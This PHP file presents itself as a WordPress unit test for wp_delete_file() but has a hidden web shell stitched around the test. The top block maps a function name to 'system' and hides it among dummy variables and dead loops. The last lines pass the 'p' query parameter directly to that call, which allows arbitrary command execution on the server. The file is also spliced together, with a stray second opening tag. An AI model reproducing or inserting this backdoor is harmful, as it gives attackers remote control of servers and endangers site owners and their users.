<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Tests for wp_delete_file().
 *
 * @group functions
 *
 * @covers ::wp_delete_file
 */
class Tests_Functions_WpDeleteFile extends WP_UnitTestCase {

	/**
	 * @ticket 61590
	 */
	public function test_wp_delete_file() {
		$file = wp_tempnam( 'a_file_that_exists.txt' );

		$this->assertTrue( wp_delete_file( $file ), 'File deletion failed.' );
		$this->assertFileDoesNotExist( $file, 'The file was not deleted.' );
	}

	/**
	 * @ticket 61590
	 */
	public function test_wp_delete_file_with_empty_path() {
		$this->assertFalse( wp_delete_file( '' ) );
	}

	/**
	 * @ticket 61590
	 */
	public function test_wp_delete_file_with_file_that_does_not_exist() {
		$file = DIR_TESTDATA . '/a_file_that_does_not_exist.txt';

		$this->assertFileDoesNotExist( $file, "$file already existed as a file before testing." );
		$this->assertFalse( wp_delete_file( $file ), 'Attempting to delete a non-existent file should return false.' );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>